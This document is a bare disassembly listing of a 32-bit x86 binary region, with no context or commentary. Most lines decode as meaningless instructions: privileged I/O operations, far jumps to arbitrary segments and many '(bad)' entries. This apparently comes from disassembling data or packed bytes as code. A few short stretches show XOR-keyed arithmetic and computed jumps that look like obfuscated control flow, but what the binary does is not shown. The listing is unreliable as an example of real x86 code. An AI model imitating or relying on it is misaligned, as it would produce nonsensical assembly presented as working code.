  409dd9:	xor    BYTE PTR [edi],bh
  409ddb:	and    DWORD PTR [eax],0x19c35d44
  409de1:	and    al,0x5b
  409de3:	retf   0x2704
  409de6:	int3   
  409de7:	popa   
  409de8:	mov    edx,0xecdca594
  409ded:	mov    dl,0xbc
  409def:	push   edi
  409df0:	outs   dx,DWORD PTR ds:[esi]
  409df1:	or     BYTE PTR [ebx+0x1],bl
  409df4:	int3   
  409df5:	push   ecx
  409df6:	fnstenv [eax]
  409df8:	and    DWORD PTR [edx-0x66],ebx
  409dfb:	push   es
  409dfc:	test   DWORD PTR [edx+ebp*1-0x54],ebp
  409e00:	cwde   
  409e01:	or     ch,BYTE PTR [esi+0x4d4100]
  409e07:	pop    edx
  409e08:	mov    esi,0x7d8fd8e2
  409e0d:	shl    BYTE PTR [eax],0x63
  409e10:	pop    ebp
  409e11:	fnstsw WORD PTR [eax+eiz*4-0x62]
  409e15:	icebp  
  409e16:	push   0x9e36a9f
  409e1b:	arpl   WORD PTR [edx],ax
  409e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e1e:	xchg   esp,eax
  409e1f:	daa    
  409e20:	mov    eax,0xdef50ae2
  409e25:	in     al,0x56
  409e27:	jno    0x409e79
  409e29:	xlat   BYTE PTR ds:[ebx]
  409e2a:	scas   eax,DWORD PTR es:[edi]
  409e2b:	inc    ebx
  409e2c:	ret    
  409e2d:	lock xchg BYTE PTR [eax+eax*4+0x21],bl
  409e32:	adc    esi,DWORD PTR [ecx-0x2cfc461e]
  409e38:	mov    bl,0xc8
  409e3a:	retf   
  409e3b:	or     al,0xca
  409e3d:	xchg   ecx,eax
  409e3e:	adc    BYTE PTR [edi],dh
  409e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e41:	cdq    
  409e42:	js     0x409dfa
  409e44:	pop    ebp
  409e45:	ins    BYTE PTR es:[edi],dx
  409e46:	sbb    al,0xbd
  409e48:	xor    eax,0xe918c613
  409e4d:	xor    eax,0x791ca054
  409e52:	stos   BYTE PTR es:[edi],al
  409e53:	xchg   ebp,eax
  409e54:	push   eax
  409e55:	int    0x8b
  409e57:	repnz addr16 push 0x59
  409e5b:	fidivr WORD PTR [ecx-0x3d1d13a4]
  409e61:	xor    eax,0x63fd4299
  409e66:	add    edx,DWORD PTR [edx+0x48]
  409e69:	(bad)  
  409e6a:	popa   
  409e6b:	mov    dh,0x43
  409e6d:	xchg   ebp,eax
  409e6e:	jge    0x409e4c
  409e70:	outs   dx,BYTE PTR ds:[esi]
  409e71:	shr    bh,1
  409e73:	es push ebp
  409e75:	into   
  409e76:	inc    esp
  409e77:	stos   DWORD PTR es:[edi],eax
  409e78:	jecxz  0x409e17
  409e7a:	mov    bl,0x46
  409e7c:	repz hlt 
  409e7e:	pop    ebx
  409e7f:	mov    BYTE PTR [ebx+0x1f],bh
  409e82:	bound  edx,QWORD PTR [eax-0x1f926cee]
  409e88:	fmul   st(5),st
  409e8a:	dec    esp
  409e8b:	jge    0x409ead
  409e8d:	dec    ebx
  409e8e:	pop    edi
  409e8f:	inc    ebp
  409e90:	xchg   esi,eax
  409e91:	into   
  409e92:	leave  
  409e93:	pusha  
  409e94:	sbb    BYTE PTR [esi+0x31],0xc3
  409e98:	inc    edx
  409e99:	je     0x409e9d
  409e9b:	call   0x7d2c5e6d
  409ea0:	push   0xcc37dc52
  409ea5:	iret   
  409ea6:	inc    esi
  409ea7:	cmp    DWORD PTR [si],esp
  409eaa:	sub    eax,DWORD PTR [edx]
  409eac:	jmp    0x409ef2
  409eae:	arpl   cx,sp
  409eb0:	test   BYTE PTR [esi-0x7dac77df],ah
  409eb6:	(bad)  
  409eb7:	adc    DWORD PTR ds:0xe60462f7,edx
  409ebd:	enter  0x498e,0x11
  409ec1:	popa   
  409ec2:	xrelease mov BYTE PTR [edi],ah
  409ec5:	mov    esi,0x487c9999
  409eca:	js     0x409eb2
  409ecc:	cli    
  409ecd:	lods   al,BYTE PTR ds:[esi]
  409ece:	ror    edx,cl
  409ed0:	mov    ebx,0x70356612
  409ed5:	call   0xdb89:0xfa21cf50
  409edc:	int3   
  409edd:	int    0x3a
  409edf:	dec    esi
  409ee0:	jmp    0x409e8e
  409ee2:	adc    ebx,ecx
  409ee4:	jnp    0x409e98
  409ee6:	repz cmp BYTE PTR [ecx-0x36],bh
  409eea:	push   0x5657b21f
  409eef:	test   BYTE PTR [eax-0x20d4a4b4],dl
  409ef5:	add    ecx,0x66
  409ef8:	dec    edx
  409ef9:	xchg   ecx,eax
  409efa:	mov    al,ds:0xf961a826
  409eff:	cmp    esi,DWORD PTR ds:0xd4afee2e
  409f05:	int3   
  409f06:	shl    BYTE PTR [edx-0x6e],1
  409f09:	mov    dl,0xd5
  409f0b:	jb     0x409f0a
  409f0d:	dec    eax
  409f0e:	sbb    eax,0x74430324
  409f13:	jno    0x409f1b
  409f15:	jl     0x409f75
  409f17:	add    ebp,DWORD PTR [ebx+eax*8+0x48]
  409f1b:	scas   al,BYTE PTR es:[edi]
  409f1c:	arpl   WORD PTR [edi+0x5a],bx
  409f1f:	mov    bl,0xb5
  409f21:	jns    0x409f1c
  409f23:	inc    ebx
  409f24:	push   0x547a3afd
  409f29:	jb     0x409f25
  409f2b:	xchg   ebp,eax
  409f2c:	stos   BYTE PTR es:[edi],al
  409f2d:	sbb    DWORD PTR [esi-0x774fa13e],ebx
  409f33:	jne    0x409f98
  409f35:	push   ss
  409f36:	cdq    
  409f37:	push   ss
  409f38:	cld    
  409f39:	push   edx
  409f3a:	push   cs
  409f3b:	retf   
  409f3c:	mov    ch,0x29
  409f3e:	fdiv   QWORD PTR [ebx+0x31]
  409f41:	or     eax,0x23e1b453
  409f46:	icebp  
  409f47:	popa   
  409f48:	ds out 0x9f,eax
  409f4b:	and    DWORD PTR [edx-0x247e863c],esi
  409f51:	lock pop edx
  409f53:	jno    0x409eef
  409f55:	mov    ch,0xe2
  409f57:	push   edx
  409f58:	mov    eax,ds:0x65c53cad
  409f5d:	mov    esp,0x8780e54c
  409f62:	retf   
  409f63:	push   esi
  409f64:	push   esi
  409f65:	and    BYTE PTR [ebx],bh
  409f67:	jg     0x409f98
  409f69:	ret    0xf4c3
  409f6c:	lock enter 0x870a,0x4a
  409f71:	out    dx,eax
  409f72:	mov    bh,0xae
  409f74:	iret   
  409f75:	retf   
  409f76:	mov    al,0xbe
  409f78:	xchg   edi,eax
  409f79:	sub    edi,edi
  409f7b:	fcom   QWORD PTR [ebp-0x5c24daaa]
  409f81:	mov    edi,0x73048a66
  409f86:	inc    ebp
  409f87:	push   edx
  409f88:	inc    eax
  409f89:	xchg   esi,eax
  409f8a:	(bad)  
  409f8c:	fsubr  DWORD PTR [edx+0x52010440]
  409f92:	or     edi,esp
  409f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f95:	ins    BYTE PTR es:[edi],dx
  409f96:	test   DWORD PTR [ecx+0x1c],esp
  409f99:	outs   dx,DWORD PTR ds:[esi]
  409f9a:	stos   DWORD PTR es:[edi],eax
  409f9b:	mov    fs,eax
  409f9d:	sub    ch,dh
  409f9f:	mov    bl,0xdb
  409fa1:	lds    eax,FWORD PTR [edi+0x314b542f]
  409fa7:	inc    ebx
  409fa8:	xor    eax,0x5b770ad4
  409fad:	pop    eax
  409fae:	pop    eax
  409faf:	(bad)  
  409fb0:	daa    
  409fb1:	and    dl,cl
  409fb3:	lods   eax,DWORD PTR ds:[esi]
  409fb4:	mov    al,0x9a
  409fb6:	adc    eax,0xd2bc759b
  409fbb:	rcl    BYTE PTR [edi+edx*4+0x1c],cl
  409fbf:	adc    DWORD PTR [eax-0xe596d46],edi
  409fc5:	push   esi
  409fc6:	sbb    esp,DWORD PTR [ecx]
  409fc8:	cmc    
  409fc9:	jbe    0x40a041
  409fcb:	mov    esi,0x86c78d77
  409fd0:	fmul   st,st(1)
  409fd2:	dec    esp
  409fd3:	add    BYTE PTR [ecx+0x7408f691],cl
  409fd9:	dec    edi
  409fda:	sbb    al,0x6d
  409fdc:	and    BYTE PTR [eax+0x918e9f],0xa4
  409fe3:	dec    ebp
  409fe4:	xlat   BYTE PTR ds:[ebx]
  409fe5:	aas    
  409fe6:	mov    esp,DWORD PTR [ebp+0x7b3adea7]
  409fec:	jno    0x409ffd
  409fee:	(bad)  
  409fef:	sar    DWORD PTR [ecx-0x4aa2c150],1
  409ff5:	mov    edx,0x524eabc6
  409ffa:	(bad)  [edx-0x73]
  409ffd:	push   esi
  409ffe:	sbb    cl,BYTE PTR [ebp+0x1eb4de54]
  40a004:	scas   al,BYTE PTR es:[edi]
  40a005:	and    al,0xe3
  40a007:	movq   QWORD PTR [ebx-0x39cc0fb3],mm1
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x5d]
  40a02a:	push   eax
  40a02b:	and    al,0x79
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	bound  edx,QWORD PTR [eax+edi*1-0x64]
  40a039:	mov    esi,0x389f6a76
  40a03e:	cmp    al,0x68
  40a040:	jp     0x40a0af
  40a042:	and    DWORD PTR [ecx+edi*1-0x4a],ecx
  40a046:	or     edi,DWORD PTR [edi]
  40a048:	cmp    eax,0x3f9910f1
  40a04d:	jmp    0x409ffa
  40a04f:	inc    eax
  40a050:	aas    
  40a051:	inc    edx
  40a052:	cld    
  40a053:	(bad)  
  40a054:	jmp    0x40a024
  40a056:	fst    st(2)
  40a058:	in     eax,dx
  40a059:	push   edx
  40a05a:	jg     0x40a014
  40a05c:	(bad)  
  40a05d:	shl    DWORD PTR [eax+0x7e],cl
  40a060:	mov    ebx,0x5edd25b2
  40a065:	imul   edi,ecx,0xffffff83
  40a068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a069:	into   
  40a06a:	pop    ecx
  40a06b:	cmp    eax,0x2c374bac
  40a070:	adc    BYTE PTR [eax],cl
  40a072:	int3   
  40a073:	inc    edx
  40a074:	pop    ebp
  40a075:	stc    
  40a076:	(bad)  
  40a077:	pop    eax
  40a078:	push   ecx
  40a079:	dec    ebx
  40a07a:	push   ebp
  40a07b:	and    al,0x53
  40a07d:	and    DWORD PTR [ebx],edi
  40a07f:	mov    cl,0xec
  40a081:	or     al,0xc2
  40a083:	jecxz  0x40a01f
  40a085:	clc    
  40a086:	mov    ah,BYTE PTR [ebx-0x3d]
  40a089:	add    al,0xb3
  40a08b:	push   ss
  40a08c:	fnsave [esi-0x78]
  40a08f:	sbb    eax,0x80a7c87f
  40a094:	aaa    
  40a095:	pop    ss
  40a096:	mov    eax,0xe4cde1b0
  40a09b:	mov    es,WORD PTR [ebx+0x1eb498fb]
  40a0a1:	sub    al,0x26
  40a0a3:	mov    al,ds:0x612c559c
  40a0a8:	daa    
  40a0a9:	xor    ch,BYTE PTR [esi+esi*1]
  40a0ac:	scas   al,BYTE PTR es:[edi]
  40a0ad:	mov    ch,0xa8
  40a0af:	xor    al,0x5b
  40a0b1:	xchg   ecx,eax
  40a0b2:	mov    ecx,cs
  40a0b4:	or     ah,cl
  40a0b6:	push   eax
  40a0b7:	stc    
  40a0b8:	lods   eax,DWORD PTR ds:[esi]
  40a0b9:	ins    DWORD PTR es:[edi],dx
  40a0ba:	mov    ds:0x4b77ce8a,eax
  40a0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c0:	fst    st(0)
  40a0c2:	mov    dl,BYTE PTR [edx-0xc]
  40a0c5:	dec    ebp
  40a0c6:	enter  0x94ae,0xaa
  40a0ca:	or     eax,0x254a4604
  40a0cf:	add    ebx,DWORD PTR [edi-0x1b]
  40a0d2:	add    dh,BYTE PTR [ecx-0x464c6c3e]
  40a0d8:	mov    ecx,0x13ca8e38
  40a0dd:	ret    0x5cbb
  40a0e0:	jmp    0x1786:0x72e6be60
  40a0e7:	dec    edi
  40a0e8:	mov    edx,0xf6042db4
  40a0ed:	push   edi
  40a0ee:	mov    esp,0xf5faaf8e
  40a0f3:	dec    edi
  40a0f4:	or     cl,BYTE PTR [edx-0x37b01834]
  40a0fa:	jg     0x40a0d0
  40a0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0fd:	aam    0xa6
  40a0ff:	daa    
  40a100:	lahf   
  40a101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a102:	xchg   edi,eax
  40a103:	cld    
  40a104:	adc    DWORD PTR [ecx-0x7f],eax
  40a107:	cld    
  40a108:	cld    
  40a109:	mov    cl,0x2c
  40a10b:	test   DWORD PTR [eax],ebx
  40a10d:	mov    esp,0x9d7e43c8
  40a112:	pop    ebx
  40a113:	pop    ecx
  40a114:	pushf  
  40a115:	mov    dl,0x79
  40a117:	aas    
  40a118:	dec    edi
  40a119:	mov    dl,0xfc
  40a11b:	int3   
  40a11c:	inc    ecx
  40a11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a11e:	daa    
  40a11f:	pop    ebp
  40a120:	and    al,0x5d
  40a122:	jp     0x40a117
  40a124:	mov    ds:0x895a53f2,al
  40a129:	and    DWORD PTR [eax],0xffffff8a
  40a12c:	aas    
  40a12d:	pop    esi
  40a12e:	popa   
  40a12f:	dec    ecx
  40a130:	sbb    DWORD PTR [esi],ecx
  40a132:	stos   DWORD PTR es:[edi],eax
  40a133:	cmc    
  40a134:	xor    eax,0xb2a0ba26
  40a139:	add    eax,0x238ce152
  40a13e:	enter  0x251e,0x83
  40a142:	fadd   st(3),st
  40a144:	out    0xfe,al
  40a146:	dec    eax
  40a147:	cmp    DWORD PTR ds:[edi-0x6b3f7663],edi
  40a14e:	enter  0xa4d7,0x4e
  40a152:	test   eax,0x16157d9f
  40a157:	cmp    al,BYTE PTR [ebx+0x35bd2d18]
  40a15d:	lahf   
  40a15e:	xor    dl,ah
  40a160:	pop    ebp
  40a161:	aam    0x5b
  40a163:	sbb    al,0xd3
  40a165:	scas   eax,DWORD PTR es:[edi]
  40a166:	scas   eax,DWORD PTR es:[edi]
  40a167:	aas    
  40a168:	sbb    eax,DWORD PTR [ecx]
  40a16a:	mov    al,0xdf
  40a16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16d:	daa    
  40a16e:	sbb    eax,0x4b27f76e
  40a173:	test   esp,ecx
  40a175:	sbb    eax,0xbdaf27cd
  40a17a:	aas    
  40a17b:	sbb    BYTE PTR ds:0xa4d0a407,0x2b
  40a182:	cdq    
  40a183:	aaa    
  40a184:	xchg   edi,eax
  40a185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a186:	adc    BYTE PTR [ecx+0x1e83fb9b],ah
  40a18c:	push   ss
  40a18d:	jg     0x40a197
  40a18f:	sbb    eax,0xecc494a8
  40a194:	or     BYTE PTR [esi+ebx*8+0xd],dl
  40a198:	jae    0x40a159
  40a19a:	inc    BYTE PTR [edi]
  40a19c:	out    dx,eax
  40a19d:	xchg   esp,eax
  40a19e:	sub    dl,BYTE PTR [edx]
  40a1a0:	or     BYTE PTR [ecx+0x55],0x78
  40a1a4:	dec    edx
  40a1a5:	sbb    al,0x1f
  40a1a7:	das    
  40a1a8:	xchg   ecx,eax
  40a1a9:	jno    0x40a227
  40a1ab:	daa    
  40a1ac:	repz push ebx
  40a1ae:	inc    ecx
  40a1af:	std    
  40a1b0:	inc    esi
  40a1b1:	jb     0x40a190
  40a1b3:	mov    fs,WORD PTR cs:[edi+eax*8+0x1a]
  40a1b8:	xchg   esi,eax
  40a1b9:	lock ret 
  40a1bb:	loope  0x40a1d5
  40a1bd:	les    eax,FWORD PTR [ebx+0x2bb86675]
  40a1c3:	test   bl,cl
  40a1c5:	pop    esp
  40a1c6:	adc    BYTE PTR [esi-0x6e],cl
  40a1c9:	adc    cl,BYTE PTR [eax]
  40a1cb:	adc    BYTE PTR [edx+0x4d],cl
  40a1ce:	fisttp QWORD PTR [ebp-0x41]
  40a1d1:	ss aam 0x23
  40a1d4:	mov    ebx,0x1a51481d
  40a1d9:	vmread ebp,ebp
  40a1dc:	pop    eax
  40a1dd:	mov    ecx,0xdac3b439
  40a1e2:	repz jge 0x40a177
  40a1e5:	adc    bh,dl
  40a1e7:	nop
  40a1e8:	xchg   esp,eax
  40a1e9:	and    edi,ebp
  40a1eb:	js     0x40a1c6
  40a1ed:	ror    ch,cl
  40a1ef:	push   ds
  40a1f0:	jbe    0x40a221
  40a1f2:	push   ds
  40a1f3:	mov    ah,0x7b
  40a1f5:	into   
  40a1f6:	xor    ah,bh
  40a1f8:	mov    cl,0xa2
  40a1fa:	(bad)  
  40a1fb:	pusha  
  40a1fc:	js     0x40a1a8
  40a1fe:	sub    esi,DWORD PTR [esi]
  40a200:	(bad)  
  40a201:	dec    ebx
  40a202:	std    
  40a203:	aaa    
  40a204:	adc    bl,bl
  40a206:	pop    ecx
  40a207:	xor    DWORD PTR [esi+eiz*8+0x2b],esi
  40a20b:	loope  0x40a1cb
  40a20d:	xchg   ebp,eax
  40a20e:	nop
  40a20f:	adc    DWORD PTR [esi+0x4626506],eax
  40a215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a216:	cmp    BYTE PTR [ebp-0x62],bl
  40a219:	aaa    
  40a21a:	fbstp  TBYTE PTR [esi-0x6a]
  40a21d:	sub    DWORD PTR [ebx+0x7c],eax
  40a220:	psrad  mm3,QWORD PTR [esp+ecx*4-0x5d]
  40a225:	lods   al,BYTE PTR ds:[esi]
  40a226:	inc    ebx
  40a227:	je     0x40a1bf
  40a229:	jge    0x40a1f1
  40a22b:	jle    0x40a1c5
  40a22d:	fsubr  QWORD PTR [edi]
  40a22f:	xlat   BYTE PTR ds:[ebx]
  40a230:	xlat   BYTE PTR ds:[ebx]
  40a231:	aas    
  40a232:	jp     0x40a275
  40a234:	add    esi,DWORD PTR [esi]
  40a236:	add    al,0xcc
  40a238:	add    BYTE PTR [esi+eiz*2+0x4138b650],ah
  40a23f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a240:	icebp  
  40a241:	jnp    0x40a274
  40a243:	pusha  
  40a244:	push   0x4df9f715
  40a249:	es jns 0x40a1d9
  40a24c:	sub    DWORD PTR [esi+0x1217337d],edx
  40a252:	adc    al,0x7
  40a254:	inc    eax
  40a255:	test   al,0xa3
  40a257:	loopne 0x40a279
  40a259:	call   0x4db14dcd
  40a25e:	and    al,BYTE PTR es:[ecx+edi*1+0x51]
  40a263:	mov    ebx,DWORD PTR [ecx-0x52]
  40a266:	pushf  
  40a267:	push   esp
  40a268:	add    al,0xca
  40a26a:	jo     0x40a20f
  40a26c:	stc    
  40a26d:	scas   eax,DWORD PTR es:[edi]
  40a26e:	out    0xdd,eax
  40a270:	push   es
  40a271:	or     BYTE PTR [ecx+0x65965bcb],dh
  40a277:	push   ss
  40a278:	or     dl,ch
  40a27a:	xor    BYTE PTR [eax],dl
  40a27c:	shl    BYTE PTR [eax],1
  40a27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a27f:	in     eax,0x34
  40a281:	push   edx
  40a282:	sbb    BYTE PTR fs:[ebx+0x79],dh
  40a286:	das    
  40a287:	stc    
  40a288:	in     eax,dx
  40a289:	clflush BYTE PTR [edi-0x7e326cef]
  40a290:	mov    ah,BYTE PTR [edx]
  40a292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a293:	data16 in al,dx
  40a295:	cmp    al,0x0
  40a297:	fsubr  DWORD PTR [edi+0x4b00b0a0]
  40a29d:	aad    0x75
  40a29f:	popw   ss
  40a2a1:	enter  0xc768,0x89
  40a2a5:	shl    eax,1
  40a2a7:	fs movntq (bad),mm6
  40a2a9:	out    0xf6,eax
  40a2ab:	hlt    
  40a2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2ad:	lods   eax,DWORD PTR ds:[esi]
  40a2ae:	jmp    0x5d4a:0x461d2a04
  40a2b5:	scas   eax,DWORD PTR es:[edi]
  40a2b6:	push   ebp
  40a2b7:	ror    DWORD PTR ds:0xc354cbba,cl
  40a2bd:	or     dh,cl
  40a2bf:	pop    ebx
  40a2c0:	(bad)
  40a2c4:	sub    BYTE PTR [ebx-0x6971ba7e],ah
  40a2ca:	nop
  40a2cb:	add    eax,0xadbccab6
  40a2d0:	ret    0xc288
  40a2d3:	cmp    ebp,edx
  40a2d5:	lods   al,BYTE PTR ds:[esi]
  40a2d6:	add    DWORD PTR [edx],0x51
  40a2d9:	ret    0xc474
  40a2dc:	and    al,ch
  40a2de:	inc    eax
  40a2df:	inc    esi
  40a2e0:	fisttp WORD PTR [eax]
  40a2e2:	inc    ebp
  40a2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2e4:	lods   eax,DWORD PTR ds:[esi]
  40a2e5:	mov    ds:0x8b37c4e7,al
  40a2ea:	inc    edx
  40a2eb:	lds    edi,FWORD PTR [eax]
  40a2ed:	push   edx
  40a2ee:	or     eax,ebp
  40a2f0:	sub    edi,DWORD PTR [edx]
  40a2f2:	cmc    
  40a2f3:	inc    esp
  40a2f4:	dec    esp
  40a2f5:	rcr    DWORD PTR [ecx+eiz*1],1
  40a2f8:	xchg   esi,eax
  40a2f9:	gs loope 0x40a294
  40a2fc:	xchg   edx,eax
  40a2fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2fe:	aad    0x55
  40a300:	push   esp
  40a301:	dec    ebp
  40a302:	outs   dx,BYTE PTR ds:[esi]
  40a303:	adc    esp,0xffffffb9
  40a306:	push   es
  40a307:	add    BYTE PTR [edx+0x3b663a21],ch
  40a30d:	xor    DWORD PTR [edx],edx
  40a30f:	aaa    
  40a310:	or     al,0xcb
  40a312:	sub    esi,DWORD PTR [edi-0x32e933c9]
  40a318:	sti    
  40a319:	jnp    0x40a36b
  40a31b:	sbb    bh,dl
  40a31d:	xchg   ecx,eax
  40a31e:	xchg   esp,eax
  40a31f:	(bad)  
  40a320:	mov    ch,0xfa
  40a322:	imul   eax,DWORD PTR [ebp+0x65],0xffffffa9
  40a326:	jle    0x40a2f4
  40a328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a329:	pop    ss
  40a32a:	jnp    0x40a2b9
  40a32c:	ins    DWORD PTR es:[edi],dx
  40a32d:	fs push ss
  40a32f:	jae    0x40a33d
  40a331:	jb     0x40a2ea
  40a333:	mov    ecx,0xf4fa90c7
  40a338:	mov    esi,0x65bace33
  40a33d:	(bad)  
  40a33e:	int    0xff
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	loopne 0x40a393
  40a3cd:	loopne 0x40a396
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	sub    al,0x57
  40a3d9:	(bad)  
  40a3da:	sbb    BYTE PTR [eax-0x7],0x6a
  40a3de:	ss ins DWORD PTR es:[edi],dx
  40a3e0:	jmp    0xe392:0x1f0fff51
  40a3e7:	lea    eax,[eax+0x31f0e0d2]
  40a3ed:	sbb    ebx,DWORD PTR [eax+0x43355eb]
  40a3f3:	mov    edi,0x8c21cd5d
  40a3f8:	inc    esp
  40a3f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3fb:	dec    edi
  40a3fc:	stc    
  40a3fd:	in     al,dx
  40a3fe:	push   ebx
  40a3ff:	scas   eax,DWORD PTR es:[edi]
  40a400:	ja     0x40a3be
  40a402:	ja     0x40a445
  40a404:	jne    0x40a42f
  40a406:	mov    edx,0x274535de
  40a40b:	add    dl,BYTE PTR [ebx+edx*8]
  40a40e:	or     ebp,ebp
  40a410:	clc    
  40a411:	stos   DWORD PTR es:[edi],eax
  40a412:	cmp    bl,BYTE PTR [edx+0x5]
  40a415:	push   esi
  40a416:	jae    0x40a40f
  40a418:	push   ebx
  40a419:	push   eax
  40a41a:	aaa    
  40a41b:	retf   
  40a41c:	sub    eax,ebp
  40a41e:	or     ch,bh
  40a420:	outs   dx,DWORD PTR ds:[esi]
  40a421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a422:	js     0x40a43f
  40a424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a425:	fcomp  st(3)
  40a427:	mov    al,0x99
  40a429:	(bad)  
  40a42a:	outs   dx,DWORD PTR ds:[esi]
  40a42b:	fwait
  40a42c:	jmp    0xb2dc8134
  40a431:	outs   dx,BYTE PTR ds:[esi]
  40a432:	mov    ecx,0x6b7edca6
  40a437:	sub    al,0xaa
  40a439:	pop    esp
  40a43a:	mov    al,0x1b
  40a43c:	mov    WORD PTR [eax-0x6a],ds
  40a43f:	or     al,0x7c
  40a441:	mov    eax,ds:0x25c37a3e
  40a446:	or     ebp,DWORD PTR [ebx+ecx*2+0x5008a0a5]
  40a44d:	in     al,0xd1
  40a44f:	pop    edi
  40a450:	in     al,0x72
  40a452:	add    BYTE PTR [ecx+esi*4+0x6d],0x65
  40a457:	mov    eax,0xbe0c4987
  40a45c:	dec    DWORD PTR [edx-0x45c1ec0e]
  40a462:	xchg   esi,eax
  40a463:	addr16 std 
  40a465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a466:	adc    DWORD PTR [ebp+0x7d],ebx
  40a469:	inc    esp
  40a46a:	adc    al,0x14
  40a46c:	inc    esp
  40a46d:	mov    edx,es
  40a46f:	or     DWORD PTR [esi+0x4f],0xffffffaa
  40a473:	shr    BYTE PTR [edi],1
  40a475:	cmp    al,0xc
  40a477:	push   ebp
  40a478:	lahf   
  40a479:	cdq    
  40a47a:	(bad)  
  40a47b:	(bad)  
  40a47d:	call   0xce010dfe
  40a482:	adc    DWORD PTR [ecx+0x562e0fb],0x18
  40a489:	mov    al,0xe1
  40a48b:	or     al,0x91
  40a48d:	mov    BYTE PTR [edi+0x474c66a2],0xa
  40a494:	shl    DWORD PTR [esi],cl
  40a496:	pop    ecx
  40a497:	test   dl,bh
  40a499:	icebp  
  40a49a:	jae    0x40a4a4
  40a49c:	sahf   
  40a49d:	add    DWORD PTR [esi],0x313bcebe
  40a4a3:	add    ch,BYTE PTR [ebx-0x18]
  40a4a6:	into   
  40a4a7:	or     eax,0xdcef64e9
  40a4ac:	jno    0x40a438
  40a4ae:	leave  
  40a4af:	ins    DWORD PTR es:[edi],dx
  40a4b0:	jne    0x40a492
  40a4b2:	and    DWORD PTR [edx+0x7b5e615b],eax
  40a4b8:	dec    edx
  40a4b9:	into   
  40a4ba:	sbb    edx,DWORD PTR [ebp-0x104b9cd7]
  40a4c0:	aad    0x24
  40a4c2:	dec    edx
  40a4c3:	int3   
  40a4c4:	das    
  40a4c5:	gs jle 0x40a4ce
  40a4c8:	inc    edx
  40a4c9:	push   edi
  40a4ca:	cmp    eax,0xd9ac35b8
  40a4cf:	cdq    
  40a4d0:	xchg   esi,eax
  40a4d1:	pop    edx
  40a4d2:	shl    cl,0xf3
  40a4d5:	add    DWORD PTR [esi],esp
  40a4d7:	daa    
  40a4d8:	call   0x925dc5f7
  40a4dd:	cli    
  40a4de:	ret    
  40a4df:	jne    0x40a4d7
  40a4e1:	repz jbe 0x40a4c3
  40a4e4:	les    ebp,FWORD PTR [eax]
  40a4e6:	add    al,0xdd
  40a4e8:	jns    0x40a4f9
  40a4ea:	pop    eax
  40a4eb:	out    0x42,al
  40a4ed:	xlat   BYTE PTR ds:[ebx]
  40a4ee:	inc    eax
